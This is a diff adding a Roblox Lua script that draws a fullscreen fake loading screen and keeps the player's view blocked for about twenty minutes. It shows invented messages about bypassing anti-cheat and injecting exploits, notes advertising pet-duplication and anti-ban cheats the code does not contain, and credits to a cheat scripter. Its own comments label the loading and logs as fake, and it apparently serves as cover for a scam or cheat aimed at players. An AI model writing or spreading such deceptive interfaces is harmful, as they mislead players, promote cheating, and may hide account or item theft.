@@ -1,0 +1,170 @@
+local function loadui()
+    local player = game:GetService("Players").LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
+
+    -- Create the main ScreenGui
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "FakeLoadingUI"
+    screenGui.IgnoreGuiInset = true
+    screenGui.Parent = playerGui
+
+    -- Black fullscreen background
+    local blackBackground = Instance.new("Frame")
+    blackBackground.Size = UDim2.new(1, 0, 1, 0)
+    blackBackground.Position = UDim2.new(0, 0, 0, 0)
+    blackBackground.BackgroundColor3 = Color3.new(0, 0, 0)
+    blackBackground.Parent = screenGui
+
+    -- Centered loading message
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0.4, 0, 0.1, 0)
+    frame.Position = UDim2.new(0.3, 0, 0.45, 0)
+    frame.BackgroundTransparency = 1
+    frame.Parent = blackBackground
+
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Size = UDim2.new(1, 0, 1, 0)
+    textLabel.Text = "Initializing system... 0%"
+    textLabel.TextColor3 = Color3.new(1, 1, 1)
+    textLabel.BackgroundTransparency = 1
+    textLabel.Font = Enum.Font.SourceSansBold
+    textLabel.TextScaled = true
+    textLabel.Parent = frame
+
+    -- Progress Bar Container
+    local progressBarContainer = Instance.new("Frame")
+    progressBarContainer.Size = UDim2.new(1, 0, 0.2, 0)
+    progressBarContainer.Position = UDim2.new(0, 0, 0.5, 0)
+    progressBarContainer.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    progressBarContainer.BorderSizePixel = 0
+    progressBarContainer.Parent = frame
+
+    local progressBar = Instance.new("Frame")
+    progressBar.Size = UDim2.new(0, 0, 1, 0)
+    progressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+    progressBar.BorderSizePixel = 0
+    progressBar.Parent = progressBarContainer
+
+    -- Fun Dynamic Messages Section
+    local messages = {
+        "Bypassing Roblox Anti-Cheat...",
+        "Decrypting game files...",
+        "Establishing secure connection...",
+        "Injecting bypass methods...",
+        "Loading protection algorithms...",
+        "Decrypting player data...",
+        "Running diagnostic tests...",
+        "Testing features...",
+        "Verifying assets...",
+        "Configuring server connection..."
+    }
+
+    -- Random message function
+    local function getRandomMessage()
+        return messages[math.random(1, #messages)]
+    end
+
+    -- Adding fake technical log messages
+    local fakeMessagesFrame = Instance.new("Frame")
+    fakeMessagesFrame.Size = UDim2.new(0.3, 0, 0.2, 0)
+    fakeMessagesFrame.Position = UDim2.new(0.02, 0, 0.85, 0)
+    fakeMessagesFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    fakeMessagesFrame.BackgroundTransparency = 0.2
+    fakeMessagesFrame.BorderSizePixel = 0
+    fakeMessagesFrame.Parent = blackBackground
+
+    local fakeMessagesLabel = Instance.new("TextLabel")
+    fakeMessagesLabel.Size = UDim2.new(1, -10, 1, -10)
+    fakeMessagesLabel.Position = UDim2.new(0, 5, 0, 5)
+    fakeMessagesLabel.BackgroundTransparency = 1
+    fakeMessagesLabel.TextColor3 = Color3.new(1, 1, 1)
+    fakeMessagesLabel.Font = Enum.Font.Code
+    fakeMessagesLabel.TextScaled = false
+    fakeMessagesLabel.TextWrapped = true
+    fakeMessagesLabel.TextXAlignment = Enum.TextXAlignment.Left
+    fakeMessagesLabel.TextYAlignment = Enum.TextYAlignment.Top
+    fakeMessagesLabel.Text = getRandomMessage()
+    fakeMessagesLabel.Parent = fakeMessagesFrame
+
+    -- Update Notes Panel (left middle)
+    local updateFrame = Instance.new("Frame")
+    updateFrame.Size = UDim2.new(0.3, 0, 0.45, 0)
+    updateFrame.Position = UDim2.new(0.02, 0, 0.275, 0) -- Moved to center vertically
+    updateFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    updateFrame.BackgroundTransparency = 0.2
+    updateFrame.BorderSizePixel = 0
+    updateFrame.Parent = blackBackground
+
+    local updateLabel = Instance.new("TextLabel")
+    updateLabel.Size = UDim2.new(1, -10, 1, -10)
+    updateLabel.Position = UDim2.new(0, 5, 0, 5)
+    updateLabel.BackgroundTransparency = 1
+    updateLabel.TextColor3 = Color3.new(1, 1, 1)
+    updateLabel.Font = Enum.Font.Code
+    updateLabel.TextScaled = false
+    updateLabel.TextWrapped = true
+    updateLabel.TextXAlignment = Enum.TextXAlignment.Left
+    updateLabel.TextYAlignment = Enum.TextYAlignment.Top
+    updateLabel.Text = [[
+New Update:
+
+• Added dupe seeds/pets
+• Added auto give moonlit/bloodlit to owl
+• Added auto buy cosmetics
+• Added anti-steal (your garden is protected in public/private)
+• Also added a lot more...
+
+Fixes:
+• Fixed several bugs where features wouldn't work
+• Now fully functional
+
+Bonus:
+• Auto detects if a banwave is coming
+]]
+    updateLabel.Parent = updateFrame
+
+    -- Credits Section (bottom-left)
+    local creditsFrame = Instance.new("Frame")
+    creditsFrame.Size = UDim2.new(0.3, 0, 0.2, 0)
+    creditsFrame.Position = UDim2.new(0.02, 0, 0.7, 0)  -- Placed below the update notes
+    creditsFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    creditsFrame.BackgroundTransparency = 0.2
+    creditsFrame.BorderSizePixel = 0
+    creditsFrame.Parent = blackBackground
+
+    local creditsLabel = Instance.new("TextLabel")
+    creditsLabel.Size = UDim2.new(1, -10, 1, -10)
+    creditsLabel.Position = UDim2.new(0, 5, 0, 5)
+    creditsLabel.BackgroundTransparency = 1
+    creditsLabel.TextColor3 = Color3.new(1, 1, 1)
+    creditsLabel.Font = Enum.Font.Code
+    creditsLabel.TextScaled = false
+    creditsLabel.TextWrapped = true
+    creditsLabel.TextXAlignment = Enum.TextXAlignment.Left
+    creditsLabel.TextYAlignment = Enum.TextYAlignment.Top
+    creditsLabel.Text = [[
+Credits:
+
+• Script by xX_ScripterKing_Xx
+• Special thanks to BaconBoss for helping with anti-ban features
+• A huge shoutout to Secret Hub for the inspiration!
+]]
+    creditsLabel.Parent = creditsFrame
+
+    -- Fake loading logic (10 minutes total)
+    for i = 1, 100 do
+        textLabel.Text = "Downloading assets... " .. i .. "%"
+        progressBar.Size = UDim2.new(i / 100, 0, 1, 0)
+        fakeMessagesLabel.Text = getRandomMessage()
+        task.wait(6)  -- Wait between updates
+    end
+
+    -- Wait for 10 minutes to simulate long loading
+    wait(600)
+
+    -- Remove the UI once done
+    screenGui:Destroy()
+end
+
+-- Run it
+task.spawn(loadui)
